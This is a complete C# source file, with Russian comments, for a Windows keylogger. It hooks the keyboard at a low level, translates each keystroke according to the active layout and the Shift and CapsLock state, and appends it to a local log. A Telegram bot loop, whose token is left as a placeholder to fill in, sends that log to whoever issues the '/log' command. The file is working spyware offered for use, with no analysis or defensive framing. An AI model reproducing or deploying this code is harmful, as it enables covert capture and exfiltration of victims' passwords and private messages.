using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal static class Program
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x100, WM_SYSKEYDOWN = 0x104;
    private const int WM_KEYUP = 0x101, WM_SYSKEYUP = 0x105;

    private const string BotToken = "ВАШ ТОКЕН БОТА"; // <-- сюда вставьте токен вашего бота

    private static IntPtr hook = IntPtr.Zero;
    private static HookProc callback;
    private static StreamWriter writer;
    private static string chatIdPath;
    private static string logPath;
    private static string chatId = null;

    // Состояние модификаторов — обновляется прямо в хуке
    private static volatile bool shiftDown = false;
    private static volatile bool capsOn = false;

    private sealed class RawKey
    {
        public uint Vk;
        public uint Scan;
        public bool Shift;
        public bool Caps;
        public DateTime Time;
    }

    private sealed class Node { public RawKey K; public Node Next; }
    private static Node head = null;
    private static Node tail = null;

    private static string pendingDead = null;

    [STAThread]
    private static void Main()
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        logPath = Path.Combine(baseDir, "keystrokes.txt");
        chatIdPath = Path.Combine(baseDir, "chat_id.txt");

        if (File.Exists(chatIdPath))
        {
            try { chatId = File.ReadAllText(chatIdPath).Trim(); }
            catch { chatId = null; }
        }

        // Инициализируем текущее состояние CapsLock при старте
        capsOn = (GetKeyState(0x14) & 0x0001) != 0;

        writer = new StreamWriter(
            new FileStream(logPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite),
            new UTF8Encoding(false));
        writer.WriteLine("=== START " + DateTime.Now + " caps=" + capsOn + " ===");
        writer.Flush();

        callback = OnKey;
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, GetModuleHandle(null), 0);

        if (hook == IntPtr.Zero)
        {
            writer.WriteLine("=== HOOK FAILED err=" + Marshal.GetLastWin32Error() + " ===");
            writer.Flush();
            writer.Dispose();
            return;
        }

        var processor = new System.Threading.Thread(ProcessLoop) { IsBackground = true };
        processor.Start();

        var poller = new System.Threading.Thread(PollLoop) { IsBackground = true };
        poller.Start();

        Application.Run();

        writer.WriteLine("=== END " + DateTime.Now + " ===");
        writer.Dispose();
        if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook);
    }

    // ==== ХУК: читает модификаторы как события + пишет основную клавишу в очередь ====
    private static IntPtr OnKey(int code, IntPtr msg, IntPtr data)
    {
        try
        {
            if (code >= 0)
            {
                uint m = (uint)msg;
                KeyData k = (KeyData)Marshal.PtrToStructure(data, typeof(KeyData));
                uint vk = k.vkCode;

                // --- Модификаторы ---
                if (vk == 0x10 || vk == 0xA0 || vk == 0xA1) // Shift, LShift, RShift
                {
                    if (m == WM_KEYDOWN || m == WM_SYSKEYDOWN) shiftDown = true;
                    else if (m == WM_KEYUP || m == WM_SYSKEYUP) shiftDown = false;
                    return CallNextHookEx(hook, code, msg, data);
                }

                if (vk == 0x14) // CapsLock
                {
                    if (m == WM_KEYDOWN || m == WM_SYSKEYDOWN) capsOn = !capsOn;
                    return CallNextHookEx(hook, code, msg, data);
                }

                // --- Обычные клавиши: только KeyDown ---
                if (m == WM_KEYDOWN || m == WM_SYSKEYDOWN)
                {
                    if ((k.flags & 0x10) == 0)
                    {
                        var rk = new RawKey
                        {
                            Vk = vk,
                            Scan = k.scanCode,
                            Shift = shiftDown,
                            Caps = capsOn,
                            Time = DateTime.Now
                        };
                        var node = new Node { K = rk, Next = null };
                        if (tail == null) { head = tail = node; }
                        else { tail.Next = node; tail = node; }
                    }
                }
            }
        }
        catch { }
        return CallNextHookEx(hook, code, msg, data);
    }

    private static void ProcessLoop()
    {
        while (true)
        {
            try
            {
                List<RawKey> batch = null;
                Node n = head;
                if (n != null)
                {
                    batch = new List<RawKey>();
                    while (n != null) { batch.Add(n.K); n = n.Next; }
                    head = tail = null;
                }

                if (batch != null)
                {
                    foreach (var rk in batch)
                    {
                        string text = TranslateKey((int)rk.Vk, rk.Scan, rk.Shift, rk.Caps);
                        if (!string.IsNullOrEmpty(text))
                            writer.WriteLine(rk.Time.ToString("MM-dd HH:mm:ss") + "\t" + text);
                    }
                    writer.Flush();
                }
            }
            catch { }
            System.Threading.Thread.Sleep(80);
        }
    }

    // ==== ToUnicodeEx с состоянием на момент нажатия ====
    private static string TranslateKey(int vkCode, uint scanCode, bool shiftDown, bool capsOn)
    {
        string special = SpecialKeyName(vkCode);
        if (special != null) return special;

        try
        {
            IntPtr hwnd = GetForegroundWindow();
            uint threadId = GetWindowThreadProcessId(hwnd, IntPtr.Zero);
            IntPtr layout = GetKeyboardLayout(threadId);

            byte[] keyState = new byte[256];
            if (shiftDown) keyState[0x10] = 0x80;
            if (capsOn) keyState[0x14] = 0x01;

            var sb = new StringBuilder(8);
            int result = ToUnicodeEx((uint)vkCode, scanCode, keyState, sb, sb.Capacity, 0, layout);

            if (result == 0) return "[" + ((Keys)vkCode).ToString() + "]";
            if (result < 0)
            {
                pendingDead = sb.ToString();
                return null;
            }

            string text = sb.ToString();
            if (pendingDead != null) { text = pendingDead + text; pendingDead = null; }
            if (text.Length == 1 && char.IsControl(text[0]))
                return "[" + ((Keys)vkCode).ToString() + "]";
            return text;
        }
        catch
        {
            return "[" + ((Keys)vkCode).ToString() + "]";
        }
    }

    private static string SpecialKeyName(int vkCode)
    {
        switch (vkCode)
        {
            case 0x0D: return "[Enter]";
            case 0x09: return "[Tab]";
            case 0x1B: return "[Esc]";
            case 0x08: return "[Backspace]";
            case 0x20: return " ";
            case 0x2E: return "[Delete]";
            case 0x2D: return "[Insert]";
            case 0x24: return "[Home]";
            case 0x23: return "[End]";
            case 0x21: return "[PageUp]";
            case 0x22: return "[PageDown]";
            case 0x25: return "[Left]";
            case 0x26: return "[Up]";
            case 0x27: return "[Right]";
            case 0x28: return "[Down]";
        }
        if (vkCode >= 0x70 && vkCode <= 0x7B) return "[F" + (vkCode - 0x6F) + "]";
        if (vkCode == 0x5B || vkCode == 0x5C) return "[Win]";
        if (vkCode == 0x10 || vkCode == 0xA0 || vkCode == 0xA1) return null;
        if (vkCode == 0x11 || vkCode == 0xA2 || vkCode == 0xA3) return null;
        if (vkCode == 0x12 || vkCode == 0xA4 || vkCode == 0xA5) return null;
        if (vkCode == 0x14 || vkCode == 0x90 || vkCode == 0x91) return null;
        return null;
    }

    // ==== Telegram ====
    private static void PollLoop()
    {
        long lastId = 0;
        while (true)
        {
            try
            {
                string url = "https://api.telegram.org/bot" + BotToken +
                             "/getUpdates?timeout=2&offset=" + (lastId + 1);
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "GET";
                req.Timeout = 15000;
                using (var resp = (HttpWebResponse)req.GetResponse())
                using (var sr = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                {
                    string json = sr.ReadToEnd();
                    long maxId = lastId;

                    int pos = 0;
                    while (true)
                    {
                        int ui = json.IndexOf("\"update_id\":", pos);
                        if (ui < 0) break;
                        int us = ui + 12;
                        int ue = json.IndexOfAny(new[] { ',', '}' }, us);
                        long id = long.Parse(json.Substring(us, ue - us).Trim());

                        int next = json.IndexOf("\"update_id\":", ue);
                        int bend = next < 0 ? json.Length : next;
                        string block = json.Substring(ue, bend - ue);

                        string cId = ExtractChatId(block);
                        string txt = ExtractString(block, "\"text\":");

                        if (cId != null && cId != chatId)
                        {
                            chatId = cId;
                            try { File.WriteAllText(chatIdPath, chatId); } catch { }
                            SendMessageSafe(chatId, "chat_id сохранён: " + chatId);
                        }

                        if (txt != null && cId != null)
                        {
                            string t2 = txt.Trim();
                            if (t2 == "/log")
                                SendFileSafe(cId, logPath);
                            else if (t2 == "/start")
                                SendMessageSafe(cId,
                                    "Команды:\n/log — получить лог\n/start — это сообщение");
                        }

                        if (id > maxId) maxId = id;
                        pos = bend;
                    }

                    lastId = maxId;
                }
            }
            catch { }
            System.Threading.Thread.Sleep(1000);
        }
    }

    private static string ExtractChatId(string block)
    {
        int ci = block.IndexOf("\"chat\":");
        if (ci < 0) return null;
        int ii = block.IndexOf("\"id\":", ci);
        if (ii < 0) return null;
        int s = ii + 5;
        while (s < block.Length && (block[s] == ' ' || block[s] == '"')) s++;
        int e = s;
        while (e < block.Length && (char.IsDigit(block[e]) || block[e] == '-')) e++;
        if (e == s) return null;
        return block.Substring(s, e - s);
    }

    private static string ExtractString(string block, string key)
    {
        int i = block.IndexOf(key);
        if (i < 0) return null;
        int s = i + key.Length;
        while (s < block.Length && (block[s] == ' ' || block[s] == '"')) s++;
        int e = s;
        while (e < block.Length && block[e] != '"') e++;
        return block.Substring(s, e - s).Replace("\\n", "\n").Replace("\\/", "/");
    }

    private static void SendMessageSafe(string cid, string text)
    {
        try
        {
            string url = "https://api.telegram.org/bot" + BotToken + "/sendMessage";
            string postData = "chat_id=" + Uri.EscapeDataString(cid) +
                              "&text=" + Uri.EscapeDataString(text);
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/x-www-form-urlencoded";
            byte[] body = Encoding.UTF8.GetBytes(postData);
            req.ContentLength = body.Length;
            using (var rs = req.GetRequestStream()) rs.Write(body, 0, body.Length);
            using (var resp = (HttpWebResponse)req.GetResponse()) { }
        }
        catch { }
    }

    private static void SendFileSafe(string cid, string path)
    {
        try
        {
            if (string.IsNullOrEmpty(cid) || !File.Exists(path)) return;

            string snapshot = Path.Combine(
                Path.GetDirectoryName(path),
                Path.GetFileNameWithoutExtension(path) + "_snapshot" + Path.GetExtension(path));

            byte[] fileBytes;
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, fileBytes.Length);
            }
            try { File.WriteAllBytes(snapshot, fileBytes); } catch { }

            string boundary = "----Boundary" + DateTime.Now.Ticks.ToString("x");
            string header =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                cid + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                "Лог " + DateTime.Now.ToString("yyyy-MM-dd HH:mm") + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"document\"; filename=\"keystrokes.txt\"\r\n" +
                "Content-Type: text/plain\r\n\r\n";
            byte[] hb = Encoding.UTF8.GetBytes(header);
            byte[] fb = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");

            var req = (HttpWebRequest)WebRequest.Create(
                "https://api.telegram.org/bot" + BotToken + "/sendDocument");
            req.Method = "POST";
            req.ContentType = "multipart/form-data; boundary=" + boundary;
            req.Timeout = 120000;
            req.ContentLength = hb.Length + fileBytes.Length + fb.Length;

            using (var rs = req.GetRequestStream())
            {
                rs.Write(hb, 0, hb.Length);
                rs.Write(fileBytes, 0, fileBytes.Length);
                rs.Write(fb, 0, fb.Length);
            }
            using (var resp = (HttpWebResponse)req.GetResponse()) { }
        }
        catch { }
    }

    private delegate IntPtr HookProc(int code, IntPtr msg, IntPtr data);

    [StructLayout(LayoutKind.Sequential)]
    private struct KeyData { public uint vkCode, scanCode, flags, time; public UIntPtr extraInfo; }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int id, HookProc cb, IntPtr hMod, uint tid);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr h);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr h, int code, IntPtr msg, IntPtr data);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr processId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
}